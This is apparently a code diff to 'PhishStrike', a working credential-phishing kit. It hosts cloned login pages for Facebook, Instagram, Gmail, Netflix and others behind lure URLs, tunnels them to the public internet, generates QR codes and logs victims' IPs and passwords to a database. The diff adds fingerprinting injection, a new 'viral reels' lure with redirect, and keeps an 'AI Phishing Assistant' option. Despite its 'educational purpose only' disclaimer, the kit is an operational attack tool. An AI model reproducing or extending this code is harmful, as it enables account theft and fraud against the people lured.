@@ -18,12 +18,25 @@ try:
     import qrcode
     import database
     from lib import ai_assistant
+    from lib import site_injector
 except ImportError as e:
     _missing = str(e).split("'")
     _missing = _missing[-2] if len(_missing) >= 2 else str(e)
     print(f"\n\033[1;38;2;255;50;50m[!] Missing dependency: {_missing}\033[0m")
     print(
-        "\033[1;38;2;30;144;255m[*] Run: pip3 install -r requirements.txt --break-system-packages\033[0m"
+        "\033[1;38;2;30;144;255m[*] To install all dependencies, run ONE of the following:\033[0m"
+    )
+    print(
+        "\033[1;38;2;0;255;255m    Windows      : pip install -r requirements.txt\033[0m"
+    )
+    print(
+        "\033[1;38;2;0;255;255m    Linux/macOS  : pip3 install -r requirements.txt\033[0m"
+    )
+    print(
+        "\033[1;38;2;0;255;255m    Kali/Debian  : pip3 install -r requirements.txt --break-system-packages\033[0m"
+    )
+    print(
+        "\033[1;38;2;0;255;255m    Termux       : pip install -r requirements.txt\033[0m"
     )
     sys.exit(1)
 
@@ -74,8 +87,8 @@ qr_counter = 0
 
 def strip_ansi(text):
     """Removes ANSI escape sequences from a string."""
-    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
-    return ansi_escape.sub('', text)
+    ansi_escape = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
+    return ansi_escape.sub("", text)
 
 
 def get_gradient_rgb(start_rgb, end_rgb, steps):
@@ -105,7 +118,8 @@ def slow_type(text, speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_WHITE, end="\n"
     """Prints text slowly with a gradient."""
     text = strip_ansi(text)
     steps = len(text)
-    if steps == 0: return
+    if steps == 0:
+        return
     for i, rgb in enumerate(get_gradient_rgb(start_rgb, end_rgb, steps)):
         sys.stdout.write(f"\033[38;2;{rgb[0]};{rgb[1]};{rgb[2]}m{text[i]}")
         sys.stdout.flush()
@@ -118,7 +132,7 @@ def slow_input(prompt, speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN):
     """Replacement for input() that uses slow_type for the prompt with custom user input color."""
     slow_type(prompt, speed=speed, start_rgb=start_rgb, end_rgb=end_rgb, end="")
     # Set color for user input to a vibrant Cyan/Azure
-    sys.stdout.write(f"\033[1;38;2;0;255;255m") 
+    sys.stdout.write(f"\033[1;38;2;0;255;255m")
     sys.stdout.flush()
     res = input()
     sys.stdout.write(RESET)
@@ -217,7 +231,9 @@ def kill_pid():
         os.system("taskkill /F /IM cloudflared.exe >nul 2>&1")
         os.system("taskkill /F /IM loclx.exe >nul 2>&1")
         # Kill any existing dashboard on port 5000
-        os.system('for /f "tokens=5" %a in (\'netstat -aon ^| findstr :5000\') do taskkill /F /PID %a >nul 2>&1')
+        os.system(
+            "for /f \"tokens=5\" %a in ('netstat -aon ^| findstr :5000') do taskkill /F /PID %a >nul 2>&1"
+        )
     else:
         for p in ["php", "cloudflared", "loclx"]:
             os.system(f"killall {p} > /dev/null 2>&1")
@@ -261,23 +277,37 @@ def banner():
     ]
 
     colors = [RGB_PURPLE, RGB_BLUE, RGB_CYAN, RGB_PINK, RGB_AZURE]
-    
+
     # Neon Flow Animation
     for frame in range(12):
-        sys.stdout.write("\033[H") # Move cursor to top-left
+        sys.stdout.write("\033[H")  # Move cursor to top-left
         start_c = colors[frame % len(colors)]
         mid_c = colors[(frame + 1) % len(colors)]
         end_c = colors[(frame + 2) % len(colors)]
-        
+
         print("\n\n")
         for line in art:
             # Shift the gradient each frame
             print("    " + gradient_text(line, start_c, end_c))
-        
-        print("    " + gradient_text("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", start_c, mid_c))
+
+        print(
+            "    "
+            + gradient_text(
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                start_c,
+                mid_c,
+            )
+        )
         dev_text = " [!] Cyber Security Dashboard | Developed by Farouq Shaheen & Lujain Ghatasheh "
         print("    " + gradient_text(dev_text, mid_c, end_c))
-        print("    " + gradient_text("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", end_c, start_c))
+        print(
+            "    "
+            + gradient_text(
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                end_c,
+                start_c,
+            )
+        )
         sys.stdout.flush()
         time.sleep(0.06)
 
@@ -447,10 +477,25 @@ def install_localxpose():
 def msg_exit():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
-    glitch_print(" [!] SHUTTING DOWN PHISHSTRIKE SYSTEMS... ", duration=0.6, start_rgb=RGB_PINK, end_rgb=RGB_WHITE)
+    glitch_print(
+        " [!] SHUTTING DOWN PHISHSTRIKE SYSTEMS... ",
+        duration=0.6,
+        start_rgb=RGB_PINK,
+        end_rgb=RGB_WHITE,
+    )
     print("\n")
-    slow_type(" Thank you for using this tool. Have a good day. ", speed=0.03, start_rgb=RGB_CYAN, end_rgb=RGB_PURPLE)
-    slow_type(" [!] Stay Safe & Happy Hacking! ", speed=0.02, start_rgb=RGB_PURPLE, end_rgb=RGB_PINK)
+    slow_type(
+        " Thank you for using this tool. Have a good day. ",
+        speed=0.03,
+        start_rgb=RGB_CYAN,
+        end_rgb=RGB_PURPLE,
+    )
+    slow_type(
+        " [!] Stay Safe & Happy Hacking! ",
+        speed=0.02,
+        start_rgb=RGB_PURPLE,
+        end_rgb=RGB_PINK,
+    )
     print()
     reset_color()
     sys.exit(0)
@@ -483,20 +528,41 @@ def about():
 
     print()
     slow_type(f" [!] Warning:", speed=0.01, start_rgb=RGB_RED, end_rgb=RGB_WHITE)
-    slow_type(f"  This Tool is made for educational purpose only!", speed=0.01, start_rgb=RGB_RED, end_rgb=RGB_WHITE)
-    slow_type(f"  Authors will not be responsible for any misuse!", speed=0.01, start_rgb=RGB_RED, end_rgb=RGB_WHITE)
+    slow_type(
+        f"  This Tool is made for educational purpose only!",
+        speed=0.01,
+        start_rgb=RGB_RED,
+        end_rgb=RGB_WHITE,
+    )
+    slow_type(
+        f"  Authors will not be responsible for any misuse!",
+        speed=0.01,
+        start_rgb=RGB_RED,
+        end_rgb=RGB_WHITE,
+    )
     print("\n")
-    slow_type(f"    [00] Main Menu     [99] Exit", speed=0.01, start_rgb=RGB_AZURE, end_rgb=RGB_CYAN)
+    slow_type(
+        f"    [00] Main Menu     [99] Exit",
+        speed=0.01,
+        start_rgb=RGB_AZURE,
+        end_rgb=RGB_CYAN,
+    )
     print()
-    
+
     reply = slow_input(
         f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD} ",
-        start_rgb=RGB_WHITE, end_rgb=RGB_CYAN
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_CYAN,
     )
     if reply in ["99"]:
         msg_exit()
     elif reply in ["0", "00"]:
-        slow_type(f"    [+] Synchronizing Core... Returning to Main Menu.", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_PURPLE)
+        slow_type(
+            f"    [+] Synchronizing Core... Returning to Main Menu.",
+            speed=0.01,
+            start_rgb=RGB_WHITE,
+            end_rgb=RGB_PURPLE,
+        )
         time.sleep(1)
         main_menu()
     else:
@@ -508,13 +574,18 @@ def about():
 def generate_qr(url):
     global qr_counter
     qr_counter += 1
-    slow_type(f"    [+] Initializing Tactical QR Engine...", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_PURPLE)
+    slow_type(
+        f"    [+] Initializing Tactical QR Engine...",
+        speed=0.01,
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_PURPLE,
+    )
     try:
         qr = qrcode.QRCode(
             version=1,
             error_correction=qrcode.constants.ERROR_CORRECT_L,
             box_size=5,  # Reduced size
-            border=2,    # Reduced border
+            border=2,  # Reduced border
         )
         qr.add_data(url)
         qr.make(fit=True)
@@ -523,8 +594,18 @@ def generate_qr(url):
         img = qr.make_image(fill_color="black", back_color="white")
         qr_path = os.path.join(qr_dir, f"qr_code_{qr_counter}.png")
         img.save(qr_path)
-        slow_type(f"    [+] Intelligence QR Secured at: qr_code_{qr_counter}.png", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
-        slow_type(f"    [!] QR Code for Scanning Ready:", speed=0.01, start_rgb=RGB_CYAN, end_rgb=RGB_WHITE)
+        slow_type(
+            f"    [+] Intelligence QR Secured at: qr_code_{qr_counter}.png",
+            speed=0.01,
+            start_rgb=RGB_WHITE,
+            end_rgb=RGB_CYAN,
+        )
+        slow_type(
+            f"    [!] QR Code for Scanning Ready:",
+            speed=0.01,
+            start_rgb=RGB_CYAN,
+            end_rgb=RGB_WHITE,
+        )
         print()
         qr.print_ascii(tty=True)
         print()
@@ -537,13 +618,15 @@ def cusport():
     print()
     ans = slow_input(
         f"    [?] Do You Want A Custom Port [y/N]: ",
-        start_rgb=(255, 215, 0), end_rgb=RGB_WHITE  # Gold to White for Questions
+        start_rgb=(255, 215, 0),
+        end_rgb=RGB_WHITE,  # Gold to White for Questions
     )
     if ans.lower() == "y":
         print("\n")
         cu_p = slow_input(
             f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Enter Your Custom 4-digit Port [1024-9999] : {LIGHT1}",
-            start_rgb=RGB_WHITE, end_rgb=RGB_CYAN
+            start_rgb=RGB_WHITE,
+            end_rgb=RGB_CYAN,
         )
         if cu_p.isdigit() and 1024 <= int(cu_p) <= 9999:
             PORT = cu_p
@@ -557,13 +640,23 @@ def cusport():
             banner_small()
             cusport()
     else:
-        slow_type(f"    [+] Deploying on Default Port {PORT}...", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
+        slow_type(
+            f"    [+] Deploying on Default Port {PORT}...",
+            speed=0.01,
+            start_rgb=RGB_WHITE,
+            end_rgb=RGB_CYAN,
+        )
 
 
 def setup_site():
     global stop_monitoring
     stop_monitoring.set()  # Stop any background monitoring from previous attack
-    slow_type(f"    [+] Configuring Tactical Server Environment...", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_AZURE)
+    slow_type(
+        f"    [+] Configuring Tactical Server Environment...",
+        speed=0.01,
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_AZURE,
+    )
     site_dir = os.path.join(BASE_DIR, ".sites", website)
     www_dir = os.path.join(BASE_DIR, ".server/www")
 
@@ -585,6 +678,20 @@ def setup_site():
         os.path.join(BASE_DIR, ".sites/ip.php"), os.path.join(www_dir, "ip.php")
     )
 
+    # Inject Phase 1 Features (Fingerprinting and Custom Post-Login Alerts)
+    try:
+        site_injector.inject_features(www_dir)
+        slow_type(
+            f"    [+] Advanced Fingerprinting & Alerts Injected...",
+            speed=0.01,
+            start_rgb=RGB_WHITE,
+            end_rgb=RGB_PURPLE,
+        )
+    except Exception as e:
+        print(
+            f"    {DARK}[{PINK}!{DARK}]{PINK} Warning: Could not inject advanced features: {e}"
+        )
+
     php_bin = shutil.which("php") or shutil.which("php.exe")
     if not php_bin:
         print(
@@ -592,7 +699,12 @@ def setup_site():
         )
         sys.exit(1)
 
-    slow_type(f"    [+] Initializing PHP Server Core...", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
+    slow_type(
+        f"    [+] Initializing PHP Server Core...",
+        speed=0.01,
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_CYAN,
+    )
     php_log = os.path.join(BASE_DIR, ".server/.php.log")
     with open(php_log, "w") as log:
         subprocess.Popen(
@@ -636,20 +748,33 @@ def capture_ip(silent=False):
         auth_ip_file = os.path.join(auth_dir, "ip.txt")
         with open(auth_ip_file, "a") as f:
             f.writelines(lines)
-        
+
         # Clear line and push down for clean display over input()
         print("\r\033[K", end="")
-        print(f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}")
-        slow_type(f"    [+] INFILTRATION DETECTED: {ip}", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_PURPLE)
-        print(f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}")
-        
+        print(
+            f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}"
+        )
+        slow_type(
+            f"    [+] INFILTRATION DETECTED: {ip}",
+            speed=0.01,
+            start_rgb=RGB_WHITE,
+            end_rgb=RGB_PURPLE,
+        )
+        print(
+            f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}"
+        )
+
         # Re-print prompt look-alike only if we interrupted a background input()
         if silent:
-            print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}", end="", flush=True)
+            print(
+                f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
+                end="",
+                flush=True,
+            )
 
         # Save to SQLite for Dashboard
         database.add_victim(website, "IP_ONLY", "N/A", ip)
-        
+
         # Notify Dashboard
         try:
             urllib.request.urlopen(f"http://localhost:5000/api/refresh", timeout=1)
@@ -711,13 +836,26 @@ def capture_creds(silent=False):
 
         # Clear line and push down for clean display over input()
         print("\r\033[K", end="")
-        print(f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PINK, RGB_CYAN)}")
-        slow_type(f"    [!] INTEL SECURED: {account} | {password}", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_PINK)
-        print(f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PINK)}")
+        print(
+            f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PINK, RGB_CYAN)}"
+        )
+        slow_type(
+            f"    [!] INTEL SECURED: {account} | {password}",
+            speed=0.01,
+            start_rgb=RGB_WHITE,
+            end_rgb=RGB_PINK,
+        )
+        print(
+            f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PINK)}"
+        )
 
         # Re-print prompt look-alike only if we interrupted a background input()
         if silent:
-            print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}", end="", flush=True)
+            print(
+                f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
+                end="",
+                flush=True,
+            )
 
         database.add_victim(website, account, password, ip)
 
@@ -746,16 +884,17 @@ def capture_data(silent=False):
                     current_ip = ""
                     if "IP: " in content:
                         current_ip = content.split("IP: ")[1].split("\n")[0].strip()
-                
+
                 global last_captured_ip
                 if current_ip != last_captured_ip:
                     capture_ip(silent=silent)
                     last_captured_ip = current_ip
-                
+
                 if os.path.exists(ip_file):
                     os.remove(ip_file)
-            
-            if stop_monitoring.is_set(): break
+
+            if stop_monitoring.is_set():
+                break
             time.sleep(0.5)
 
             if os.path.exists(user_file):
@@ -764,14 +903,15 @@ def capture_data(silent=False):
                 capture_creds(silent=silent)
                 if os.path.exists(user_file):
                     os.remove(user_file)
-            
-            if stop_monitoring.is_set(): break
-            
+
+            if stop_monitoring.is_set():
+                break
+
             # Simple heartbeat for silent mode - removed \r to avoid prompt overlap
             if silent and int(time.time()) % 20 == 0:
                 # Only print if not capturing
-                pass 
-                
+                pass
+
             time.sleep(0.5)
     except KeyboardInterrupt:
         print(f"\n\n    {DARK}[{WHITE}-{DARK}]{LIGHT1} Stopping monitoring...")
@@ -787,7 +927,8 @@ def custom_mask():
     print()
     mask_op = slow_input(
         f"    [?] Do you want to change Mask URL? [y/N]: ",
-        start_rgb=(255, 215, 0), end_rgb=RGB_WHITE
+        start_rgb=(255, 215, 0),
+        end_rgb=RGB_WHITE,
     )
     print()
     if mask_op.lower() == "y":
@@ -806,6 +947,23 @@ def custom_mask():
             print(
                 f"\n{DARK}[{WHITE}!{DARK}]{LIGHT2} Invalid url type..Using the Default one.."
             )
+
+    if website == "reels_video":
+        print()
+        target_op = slow_input(
+            f"    [?] Do you want to set a Target Video URL to redirect to? [y/N]: ",
+            start_rgb=(255, 215, 0),
+            end_rgb=RGB_WHITE,
+        )
+        print()
+        if target_op.lower() == "y":
+            print(
+                f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Enter the target video URL below {LIGHT2}({LIGHT2}Example: https://www.instagram.com/reel/XYZ{LIGHT2})\n"
+            )
+            global target_video_url
+            target_video_url = input(f"{LIGHT1} ==> {LIGHT2}")
+        else:
+            target_video_url = ""
 
 
 def site_stat(url):
@@ -859,10 +1017,37 @@ def custom_url(url):
         processed_url = "Unable to Short URL"
         masked_url = ""
 
-    slow_type(f"    [-] URL 1 : {url}", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_PURPLE)
-    slow_type(f"    [-] URL 2 : {processed_url}", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
+    if (
+        website == "reels_video"
+        and "target_video_url" in globals()
+        and target_video_url
+    ):
+        import urllib.parse
+
+        encoded_target = urllib.parse.quote(target_video_url)
+        if url.startswith("http"):
+            url += f"?target={encoded_target}"
+        if processed_url.startswith("http"):
+            processed_url += f"?target={encoded_target}"
+        if masked_url != "":
+            masked_url += f"?target={encoded_target}"
+
+    slow_type(
+        f"    [-] URL 1 : {url}", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_PURPLE
+    )
+    slow_type(
+        f"    [-] URL 2 : {processed_url}",
+        speed=0.01,
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_CYAN,
+    )
     if "Unable" not in processed_url:
-        slow_type(f"    [-] URL 3 : {masked_url}", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_AZURE)
+        slow_type(
+            f"    [-] URL 3 : {masked_url}",
+            speed=0.01,
+            start_rgb=RGB_WHITE,
+            end_rgb=RGB_AZURE,
+        )
         generate_qr(url)
 
 
@@ -877,7 +1062,12 @@ def start_cloudflared():
     )
     loading_animation(2, "Initializing Server")
     setup_site()
-    slow_type(f"    [+] Initializing Cloudflared Multi-Proxy Tunnel...", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
+    slow_type(
+        f"    [+] Initializing Cloudflared Multi-Proxy Tunnel...",
+        speed=0.01,
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_CYAN,
+    )
 
     cld_bin = os.path.join(
         BASE_DIR,
@@ -903,13 +1093,15 @@ def start_cloudflared():
                 cldflr_url = match.group(0)
 
     custom_url(cldflr_url)
-    
+
     # Start background monitoring immediately
     stop_monitoring.clear()
     if not monitoring_thread or not monitoring_thread.is_alive():
-        monitoring_thread = threading.Thread(target=capture_data, args=(True,), daemon=True)
+        monitoring_thread = threading.Thread(
+            target=capture_data, args=(True,), daemon=True
+        )
         monitoring_thread.start()
-        
+
     post_attack_menu()
 
 
@@ -960,7 +1152,12 @@ def start_loclx():
         f"{DARK}[{WHITE}?{DARK}]{LIGHT2} Change Loclx Server Region? {PURPLE}[{LIGHT2}y{PURPLE}/{LIGHT2}N{PURPLE}]:{LIGHT2} "
     )
     loclx_region = "eu" if opinion.lower() == "y" else "us"
-    slow_type(f"    [+] Launching LocalXpose Secure Tunnel...", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_BLUE)
+    slow_type(
+        f"    [+] Launching LocalXpose Secure Tunnel...",
+        speed=0.01,
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_BLUE,
+    )
 
     loclx_bin = os.path.join(
         BASE_DIR, ".server", "loclx.exe" if platform.system() == "Windows" else "loclx"
@@ -997,13 +1194,15 @@ def start_loclx():
                 loclx_url = match.group(0)
 
     custom_url(loclx_url)
-    
+
     # Start background monitoring immediately
     stop_monitoring.clear()
     if not monitoring_thread or not monitoring_thread.is_alive():
-        monitoring_thread = threading.Thread(target=capture_data, args=(True,), daemon=True)
+        monitoring_thread = threading.Thread(
+            target=capture_data, args=(True,), daemon=True
+        )
         monitoring_thread.start()
-        
+
     post_attack_menu()
 
 
@@ -1015,14 +1214,21 @@ def start_localhost():
     time.sleep(1)
     os.system("cls" if os.name == "nt" else "clear")
     banner_small()
-    slow_type(f"    [+] Successfully Hosted at : http://{HOST}:{PORT}", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
-    
+    slow_type(
+        f"    [+] Successfully Hosted at : http://{HOST}:{PORT}",
+        speed=0.01,
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_CYAN,
+    )
+
     # Start background monitoring immediately
     stop_monitoring.clear()
     if not monitoring_thread or not monitoring_thread.is_alive():
-        monitoring_thread = threading.Thread(target=capture_data, args=(True,), daemon=True)
+        monitoring_thread = threading.Thread(
+            target=capture_data, args=(True,), daemon=True
+        )
         monitoring_thread.start()
-        
+
     post_attack_menu()
 
 
@@ -1036,7 +1242,8 @@ def tunnel_menu():
     """)
     reply = slow_input(
         f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select a port forwarding service : {MEDIUM}{BOLD} ",
-        start_rgb=RGB_WHITE, end_rgb=RGB_CYAN
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_CYAN,
     )
     if reply in ["1", "01"]:
         start_localhost()
@@ -1058,7 +1265,11 @@ def site_facebook():
 {DARK}[{WHITE}03{DARK}]{LIGHT2} Fake Security Login Page
 {DARK}[{WHITE}04{DARK}]{LIGHT2} Facebook Messenger Login Page
 """)
-    reply = slow_input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}", start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
+    reply = slow_input(
+        f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}",
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_CYAN,
+    )
     if reply in ["1", "01"]:
         website = "facebook"
         mask = "https://blue-verified-badge-for-facebook-free"
@@ -1091,7 +1302,11 @@ def site_instagram():
 {DARK}[{WHITE}03{DARK}]{LIGHT2} 1000 Followers Login Page
 {DARK}[{WHITE}04{DARK}]{LIGHT2} Blue Badge Verify Login Page
 """)
-    reply = slow_input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}", start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
+    reply = slow_input(
+        f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}",
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_CYAN,
+    )
     if reply in ["1", "01"]:
         website = "instagram"
         mask = "https://get-unlimited-followers-for-instagram"
@@ -1123,7 +1338,11 @@ def site_gmail():
 {DARK}[{WHITE}02{DARK}]{LIGHT2} Gmail New Login Page
 {DARK}[{WHITE}03{DARK}]{LIGHT2} Advanced Voting Poll
 """)
-    reply = slow_input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}", start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
+    reply = slow_input(
+        f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}",
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_CYAN,
+    )
     if reply in ["1", "01"]:
         website = "google"
         mask = "https://get-unlimited-google-drive-free"
@@ -1172,7 +1391,8 @@ def show_dashboard_info(from_attack=False):
         )
         ans = slow_input(
             f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
-            start_rgb=RGB_WHITE, end_rgb=RGB_CYAN
+            start_rgb=RGB_WHITE,
+            end_rgb=RGB_CYAN,
         )
 
         if ans in ["2", "02"]:
@@ -1195,20 +1415,36 @@ def show_dashboard_info(from_attack=False):
 def post_attack_menu():
     global monitoring_thread, stop_monitoring
     while True:
-        print(f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━ OPERATIONAL CONTROL CENTER ━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}")
-        print(f"    {DARK}╟ {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Synchronize Core (Main Menu)")
-        print(f"    {DARK}╟ {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} View Intelligence (Web Dashboard)")
-        print(f"    {DARK}╟ {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} Live Tactical Feed (Terminal Capture)")
-        print(f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}")
+        print(
+            f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━ OPERATIONAL CONTROL CENTER ━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}"
+        )
+        print(
+            f"    {DARK}╟ {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Synchronize Core (Main Menu)"
+        )
+        print(
+            f"    {DARK}╟ {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} View Intelligence (Web Dashboard)"
+        )
+        print(
+            f"    {DARK}╟ {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} Live Tactical Feed (Terminal Capture)"
+        )
+        print(
+            f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}"
+        )
 
         reply = slow_input(
             f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
-            start_rgb=RGB_WHITE, end_rgb=RGB_CYAN
+            start_rgb=RGB_WHITE,
+            end_rgb=RGB_CYAN,
         )
 
         if reply in ["1", "01"]:
             # Monitoring is already running in background
-            slow_type(f"    [+] Synchronizing Core... Returning to Tactical Command.", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_PURPLE)
+            slow_type(
+                f"    [+] Synchronizing Core... Returning to Tactical Command.",
+                speed=0.01,
+                start_rgb=RGB_WHITE,
+                end_rgb=RGB_PURPLE,
+            )
             time.sleep(1)
             main_menu()
             break
@@ -1247,15 +1483,17 @@ def main_menu():
     {DARK}\x5b{WHITE}05{DARK}\x5d{LIGHT2} Netflix       {DARK}\x5b{WHITE}10{DARK}\x5d{LIGHT2} Pinterest     {DARK}\x5b{WHITE}15{DARK}\x5d{LIGHT2} Yandex
 
     {gradient_text("    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", RGB_CYAN, RGB_PURPLE)}
-    {gradient_text("    [16] AI Phishing Assistant      [ NEW ]", RGB_CYAN, RGB_PURPLE)}
-    {gradient_text("    [17] Open Web Dashboard         [ LIVE ]", RGB_PURPLE, RGB_CYAN)}
+    {gradient_text("    [16] Social Media Reels Video   [ NEW ]", RGB_CYAN, RGB_PURPLE)}
+    {gradient_text("    [17] AI Phishing Assistant      [ NEW ]", RGB_CYAN, RGB_PURPLE)}
+    {gradient_text("    [18] Open Web Dashboard         [ LIVE ]", RGB_PURPLE, RGB_CYAN)}
     {gradient_text("    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", RGB_PURPLE, RGB_CYAN)}
 
     {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} About         {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Exit
     """)
     reply = slow_input(
         f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD} ",
-        start_rgb=RGB_WHITE, end_rgb=RGB_CYAN
+        start_rgb=RGB_WHITE,
+        end_rgb=RGB_CYAN,
     )
 
     opts = {
@@ -1277,6 +1515,7 @@ def main_menu():
         "13": ("quora", "https://quora-premium-for-free"),
         "14": ("adobe", "https://get-adobe-lifetime-pro-membership-free"),
         "15": ("yandex", "https://grab-mail-from-anyother-yandex-account-free"),
+        "16": ("reels_video", "https://watch-viral-reels-video-trending"),
     }
 
     if reply in ["1", "01"]:
@@ -1313,9 +1552,9 @@ def main_menu():
             end_rgb=RGB_WHITE,
         )
         tunnel_menu()
-    elif reply in ["16"]:
-        ai_assistant_menu()
     elif reply in ["17"]:
+        ai_assistant_menu()
+    elif reply in ["18"]:
         show_dashboard_info(from_attack=False)
     elif reply in ["99"]:
         about()
